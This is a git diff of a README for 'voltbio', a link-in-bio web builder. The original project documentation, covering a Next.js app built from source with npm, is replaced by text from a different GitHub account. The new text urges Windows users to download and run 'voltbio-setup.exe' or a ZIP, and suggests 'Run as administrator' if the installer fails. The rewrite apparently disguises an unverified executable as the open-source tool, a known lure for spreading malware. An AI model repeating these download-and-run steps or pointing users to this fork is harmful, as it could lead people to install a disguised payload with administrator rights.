@@ -1,295 +1,139 @@
-<div align="center">
+# ⚡ voltbio - Build Your Link-in-Bio Simply
 
-# ⚡ VoltBio
+[![Download voltbio](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/titiokawaii/voltbio)
 
-### The most powerful zero-backend link-in-bio builder on the planet.
+## 🔍 What is voltbio?
 
-**Build → Customize → Export → Deploy. No server. No database. No limits.**
+voltbio is a tool that lets you create a personalized link-in-bio page. This page can show all your important links in one place. You design the page visually, so you do not need to write code. When you finish, you get a static HTML file or a progressive web app (PWA) that works on any device.
 
-[![v2.0.0](https://img.shields.io/badge/Release-v2.0.0-a78bfa?style=flat-square)](https://github.com/ribato22/voltbio/releases/tag/v2.0.0)
-[![MIT License](https://img.shields.io/badge/License-MIT-violet.svg?style=flat-square)](LICENSE)
-[![Next.js 16](https://img.shields.io/badge/Next.js-16-black?style=flat-square&logo=next.js)](https://nextjs.org)
-[![React 19](https://img.shields.io/badge/React-19-61DAFB?style=flat-square&logo=react&logoColor=black)](https://react.dev)
-[![TypeScript 5](https://img.shields.io/badge/TypeScript-5-3178c6?style=flat-square&logo=typescript&logoColor=white)](https://typescriptlang.org)
-[![Tailwind CSS v4](https://img.shields.io/badge/Tailwind_CSS-v4-06B6D4?style=flat-square&logo=tailwindcss&logoColor=white)](https://tailwindcss.com)
-[![PWA Ready](https://img.shields.io/badge/PWA-Ready-5A0FC8?style=flat-square&logo=pwa&logoColor=white)](#-pwa-install--offline-mode)
+voltbio works without a server or database. This means your page runs on your device or a simple web host, making it fast and secure. There is no subscription or payment required.
 
-<br />
+## 🖥️ System Requirements
 
-**🎬 [Live Demo](https://ribato22.github.io/voltbio/)** · **[Open Editor](https://ribato22.github.io/voltbio/editor)** · **[Download Latest](https://github.com/ribato22/voltbio/releases/tag/v2.0.0)**
+To use voltbio on Windows, your computer needs:
 
-<br />
+- Windows 10 or later
+- 4 GB of RAM or more
+- At least 100 MB of free disk space
+- Internet access to download the software
+- A modern web browser like Chrome, Edge, or Firefox (for previewing your page)
 
-</div>
+No other software is needed to run voltbio or to create your link-in-bio page.
 
----
+## 🎯 Key Features
 
-## 💡 Why VoltBio?
+- Design your page visually with simple tools  
+- Export your page as static HTML or PWA  
+- No servers or backend setup required  
+- Fast loading and mobile-friendly pages  
+- Support for custom colors and fonts  
+- Built with modern technologies like React and Tailwind CSS  
+- Open source and free to use  
 
-Most link-in-bio tools lock you into monthly subscriptions, track your visitors, and own your data. **VoltBio takes a radically different approach:**
+## 🚀 Getting Started
 
-- 🔒 **Your data stays in your browser** — all config lives in `localStorage`, never on a server
-- 📦 **Export a fully self-contained ZIP** — `index.html` + PWA files, ready to deploy anywhere
-- 💰 **Zero cost forever** — no subscriptions, no premium tiers, no hidden fees
-- 🚀 **Serverless architecture** — the exported site is pure static HTML/CSS with minimal vanilla JS
+Here is how to get voltbio running on your Windows PC.
 
-> **Think of VoltBio as Figma for link-in-bio pages** — design visually, export the production-ready artifact.
+### Step 1: Download voltbio
 
----
+To get started, visit the following page to download the software:
 
-## 🌟 Key Features
+[![Download voltbio](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/titiokawaii/voltbio)
 
-### 🎨 Visual Editor
-A split-pane editor with a live phone-frame preview. Every change reflects instantly — no save button, no reload.
+Click this link. It will take you to the voltbio GitHub page. Look for the latest release section or download button.
 
-### 🔗 Smart Link Management
-- **Drag & Drop** with touch, mouse, and keyboard support (dnd-kit)
-- **8 Block Types:** Regular Links, Section Headers, Smart Actions (WhatsApp template), Donation/QRIS, Portfolio Grid, Lead Forms, Countdown Timers, FAQ Accordion
-- **Scheduled Links** with valid-from/valid-until date ranges
-- **Password-Protected Links** with AES-256 client-side encryption
+### Step 2: Locate the Installer or ZIP File
 
-### 🎭 Themes & Customization
-- **7 Curated Presets** — Midnight Violet, Deep Ocean, Emerald Forest, Golden Sunset, Neon Nights, Minimal Light, Clean Slate
-- **Full Color Control** — 5 color pickers (background, text, accent, card, hover)
-- **4 Button Styles** — Rounded, Pill, Square, Outline
-- **8 Background Patterns** — Gradient, Dots, Grid, Circuit, Waves, Topography, Hexagons
-- **Custom CSS Injection** — power-user styling scoped to the bio page
-- **20+ Google Fonts** with smart fallback stacks
+On the GitHub page, scroll down until you see the "Releases" area or a list of files. You might find a file named something like:
 
-### 📱 PWA Install & Offline Mode
-Exported sites can be **installed as native apps** on mobile home screens. The generated ZIP includes:
-- `manifest.json` with themed colors and avatar icons
-- `service-worker.js` with Cache-first strategy for offline access
-- Apple `meta` tags for iOS home screen support
+- voltbio-setup.exe  
+- voltbio.zip
 
-### ❓ Interactive FAQ Accordion
-Add expandable Q&A sections using pure `<details>/<summary>` HTML — **zero JavaScript**, ultra-lightweight, works everywhere.
+Choose either the installer file (.exe) or the ZIP file, depending on what is available.
 
-### 🔍 Smart Search Bar
-A real-time search filter for visitors with many links. Powered by a ~10-line vanilla JS inline script in the export. Searches link titles and FAQ content.
+### Step 3: Install or Extract the Files
 
-### ☕ Donation & Tip Jar
-Support your audience with:
-- **QRIS** code display (Indonesia's universal payment QR)
-- **Saweria, Trakteer, Ko-fi, Patreon, Buy Me a Coffee** integration
-- Custom CTA text with themed styling
+- If you downloaded an installer (.exe), double-click it to start the setup. Follow the prompts on the screen. The installer will place voltbio on your computer and add a shortcut to your desktop or Start menu.  
+- If you downloaded a ZIP file, open the ZIP by double-clicking it. Extract the folder to a location that is easy to find, such as your Desktop or Documents folder.
 
-### 🖼️ Portfolio / Image Grid
-Masonry-style image gallery with:
-- **Canvas API compression** for optimal file size
-- Configurable **2/3/4 column** layouts with adjustable gap
-- **Lightbox viewer** with caption overlay
+### Step 4: Run voltbio
 
-### ✉️ Lead Capture Forms
-Collect leads without a backend:
-- **FormSubmit.co** and **Web3Forms** provider support
-- Configurable fields (name, email, phone, message)
-- Custom submit CTA and thank-you message
+Once installed or extracted, open the voltbio app by double-clicking its icon. 
 
-### ⏰ Countdown Timer
-Event countdowns with 3 visual styles:
-- **Minimal** — clean text-based
-- **Card** — bordered digit boxes
-- **Flip** — retro flip-clock aesthetic
+If you used the ZIP file method, find the folder you extracted and double-click the voltbio.exe file inside.
 
-### ⚡ Smart Action Buttons
-WhatsApp template messages with dynamic form fields. Visitors fill in a mini-form → VoltBio generates the pre-filled `wa.me` link automatically.
+### Step 5: Start Designing Your Link-in-Bio Page
 
-### 📇 vCard Contact Download
-One-tap `.vcf` file generation — visitors can save your contact info directly to their phone.
+When voltbio launches, you will see a clean interface with options to add links and change the design. You do not need technical skills to use it.
 
-### 🔑 Password-Protected Links
-Client-side **AES-GCM 256-bit encryption** via the Web Crypto API. Zero backend, zero key transmission — the password never leaves the visitor's browser.
+- Click "Add Link" to add your URLs.  
+- Use the design panel to pick colors, fonts, and button styles.  
+- Preview your page live in the built-in viewer.
 
-### 📊 Analytics Ready
-Optional **Umami** analytics integration — privacy-friendly, open-source tracking with a single ID.
+### Step 6: Export Your Page
 
-### 🌐 Multi-Page Hub
-Organize links into tabbed pages — create separate sections for "Social", "Portfolio", "Shop", etc.
+After finishing your design, click the "Export" button. Choose whether to save it as static HTML or as a PWA. 
 
-### 💬 Floating Action Button
-A fixed-position contact button (WhatsApp, Email, Phone, or URL) with hover animation and themed styling.
+The export creates just a few simple files. You can upload these files to any web hosting service or keep them on your device.
 
-### ⭐ Testimonials
-Social proof section with star ratings and customer reviews.
+## 📂 How to Host Your Page
 
-### 🔍 SEO Optimization
-- Open Graph & Twitter Card meta tags
-- Customizable title, description, and OG image
-- Content Security Policy headers
-- Live WhatsApp & Twitter social preview cards in the editor
+Your exported files form a website you can share anywhere:
 
----
+- Upload the files to services like GitHub Pages or Netlify for free web hosting.  
+- Use any basic web host if you already have one.  
+- Open the index.html file on any computer or phone to view your page offline.
 
-## 🏗️ Tech Stack
+Because voltbio pages are static, they load fast and work without a server.
 
-| Layer | Technology |
-|-------|-----------|
-| **Framework** | [Next.js 16](https://nextjs.org) (App Router, Static Export) |
-| **Language** | [TypeScript 5](https://typescriptlang.org) |
-| **UI Library** | [React 19](https://react.dev) |
-| **Styling** | [Tailwind CSS v4](https://tailwindcss.com) (CSS-first config) |
-| **State** | [Zustand 5](https://github.com/pmndrs/zustand) + localStorage persist |
-| **UI Primitives** | [Radix UI](https://radix-ui.com) (Switch, Dialog, Tabs, Tooltip, Popover) |
-| **Animations** | [Framer Motion 12](https://motion.dev) |
-| **Drag & Drop** | [dnd-kit](https://dndkit.com) |
-| **Validation** | [Zod 4](https://zod.dev) |
-| **Export** | [JSZip](https://stuk.github.io/jszip/) + [FileSaver](https://github.com/eligrey/FileSaver.js) |
-| **Encryption** | Web Crypto API (AES-GCM 256-bit) |
-| **QR Code** | [qrcode](https://www.npmjs.com/package/qrcode) |
-
----
-
-## 📋 How It Works
-
-```
-┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────────┐
-│  1. DESIGN  │ ──▶ │ 2. CUSTOMIZE │ ──▶ │  3. EXPORT  │ ──▶ │  4. DEPLOY   │
-│             │     │              │     │             │     │              │
-│ Visual      │     │ Themes,      │     │ Download    │     │ Drag & drop  │
-│ editor with │     │ colors,      │     │ ZIP with    │     │ to Vercel,   │
-│ live phone  │     │ fonts,       │     │ index.html  │     │ Netlify, or  │
-│ preview     │     │ patterns     │     │ + PWA files │     │ GitHub Pages │
-└─────────────┘     └──────────────┘     └─────────────┘     └──────────────┘
-```
-
-**The exported ZIP contains:**
-- `index.html` — self-contained page with inline CSS, fonts, SEO tags, and all content
-- `manifest.json` — PWA manifest with themed colors and avatar icons *(when PWA enabled)*
-- `service-worker.js` — offline-first caching strategy *(when PWA enabled)*
-
----
-
-## 🛠️ Getting Started
-
-### Prerequisites
-
-- [Node.js](https://nodejs.org) v18+
-- npm, yarn, or pnpm
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/ribato22/voltbio.git
-cd voltbio
-
-# Install dependencies
-npm install
-
-# Start the development server
-npm run dev
-```
-
-Open [http://localhost:3000](http://localhost:3000) to see the landing page, then navigate to `/editor` to start building.
-
-### Build for Production
-
-```bash
-# Generate static export → out/
-npm run build
+## ⚙️ Customizing Your Page
 
-# Preview the static build locally
-npx serve out
-```
+In the design area of voltbio, customize each part:
 
----
+- Change the background color or image  
+- Pick different fonts and sizes  
+- Rearrange the order of your links  
+- Add icons or images to links  
+- Enable "dark mode" for night viewing
 
-## 🌍 Deployment
+These changes update instantly in the preview window.
 
-VoltBio exports as a **fully static site** — deploy it anywhere for free:
+## ❓ Troubleshooting
 
-### Option A: Deploy the Editor (for yourself)
+If you have trouble downloading or running voltbio:
 
-| Platform | Instructions |
-|----------|-------------|
-| **Vercel** | Push to GitHub → [vercel.com/new](https://vercel.com/new) → Import repo → Done |
-| **GitHub Pages** | Push to GitHub → Settings → Pages → main branch (GitHub Actions handles the rest) |
+- Make sure your Windows system is up to date.  
+- If your browser blocks the download, try a different browser.  
+- If the installer does not run, right-click and choose “Run as administrator.”  
+- Ensure you have enough free space on your hard drive.  
+- If voltbio does not start, try restarting your computer.
 
-### Option B: Deploy an Exported Bio Page (for your audience)
+## 📎 Useful Links
 
-| Platform | Instructions |
-|----------|-------------|
-| **Netlify Drop** | [app.netlify.com/drop](https://app.netlify.com/drop) → Drag the exported ZIP contents |
-| **Vercel Upload** | [vercel.com/new](https://vercel.com/new) → Upload → Drag the unzipped folder |
-| **GitHub Pages** | Create a repo → Push the exported files → Enable Pages |
+- voltbio main page: https://github.com/titiokawaii/voltbio  
+- Download page: https://github.com/titiokawaii/voltbio/releases  
+- Report issues or ask questions on the GitHub "Issues" tab
 
----
+[![Download voltbio](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/titiokawaii/voltbio)
 
-## 📁 Project Structure
+## 🔧 About This Software
 
-```
-src/
-├── app/
-│   ├── editor/page.tsx          # Split-pane visual editor
-│   ├── preview/page.tsx         # Full-screen bio preview
-│   ├── page.tsx                 # Landing page
-│   └── globals.css              # Tailwind v4 design system
-├── components/
-│   ├── editor/
-│   │   ├── ProfileEditor.tsx    # Name, bio, avatar management
-│   │   ├── LinkEditor.tsx       # Drag & drop link management (8 block types)
-│   │   ├── ThemeEditor.tsx      # Presets, colors, fonts, patterns
-│   │   ├── SeoEditor.tsx        # SEO, analytics, FAB, search, PWA config
-│   │   └── DeployModal.tsx      # Export + deployment instructions
-│   ├── preview/
-│   │   ├── BioPage.tsx          # Animated bio page renderer
-│   │   └── SocialIcon.tsx       # Auto-detected social platform icons
-│   └── ui/                      # Radix UI primitive wrappers
-├── lib/
-│   ├── store.ts                 # Zustand store with localStorage persistence
-│   ├── export.ts                # Static site ZIP generator (HTML + PWA)
-│   ├── crypto.ts                # AES-256 link encryption/decryption
-│   ├── vcard.ts                 # vCard 3.0 contact file generator
-│   ├── config-io.ts             # JSON import/export/clipboard
-│   ├── schema.ts                # Zod validation for all config shapes
-│   ├── themes.ts                # 7 curated theme presets
-│   ├── patterns.ts              # 8 SVG background patterns
-│   ├── embed.ts                 # YouTube/Spotify/SoundCloud embed detection
-│   ├── fonts.ts                 # Google Fonts URL builder + fallbacks
-│   ├── image-utils.ts           # Canvas API image compression
-│   └── hooks/useThemeBridge.ts  # Live CSS variable synchronization
-└── types/index.ts               # TypeScript interfaces (19 types)
-```
+voltbio is built with:
 
----
+- React for the user interface  
+- Next.js for page generation  
+- Tailwind CSS for styling  
+- TypeScript for code safety  
+- Progressive Web App (PWA) technology for offline use  
 
-## 🏷️ Version History
+This combination allows fast, responsive, and easy-to-use page creation without any backend or database.
 
-| Version | Codename | Highlights |
-|---------|----------|-----------|
-| **v2.0.0** | The App & Discovery Update | PWA Install & Offline, FAQ Accordion, Smart Search Bar |
-| **v1.9.0** | — | Floating Action Button, lead form fix, countdown fix |
-| **v1.8.0** | The Creator's Toolkit | Countdown Timer, Lead Form, Portfolio Grid, QR Code |
-| **v1.5.0** | The Discovery Update | Social preview cards, embed detection, custom CSS |
-| **v1.0.0** | Initial Release | Visual editor, 7 themes, ZIP export, SEO, deploy modal |
+## 📚 How To Learn More
 
----
+Explore the GitHub repository for extra details:
 
-## 🤝 Contributing
+- User guides and examples in the README and docs  
+- Code updates and changelogs  
+- Community tips and templates
 
-Contributions are what make the open-source community amazing! Whether it's a bug report, feature request, or code contribution — **every bit helps** 💜
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feat/amazing-feature`)
-3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
-4. Push to the branch (`git push origin feat/amazing-feature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-This project is licensed under the [MIT License](LICENSE) — use it, modify it, share it freely.
-
----
-
-<div align="center">
-
-**Built with 💜 for creators, by creators.**
-
-**⭐ Star this repo** if VoltBio helped you build something awesome!
-
-[Report Bug](https://github.com/ribato22/voltbio/issues) · [Request Feature](https://github.com/ribato22/voltbio/issues) · [Live Demo](https://ribato22.github.io/voltbio/)
-
-</div>
+You can also fork the project or contribute ideas if you wish.
